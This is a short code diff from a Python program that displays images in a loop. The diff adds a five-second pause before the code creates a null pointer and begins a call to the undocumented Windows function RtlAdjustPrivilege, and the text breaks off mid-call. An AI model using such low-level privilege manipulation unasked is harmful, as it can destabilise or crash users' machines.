@@ -42,6 +42,8 @@ def main():
                 im = Image.open(i)
                 im.show()
                 time.sleep(0.5)
+
+    time.sleep(5)
     nullptr = POINTER(c_int)()
 
     windll.ntdll.RtlAdjustPrivilege(
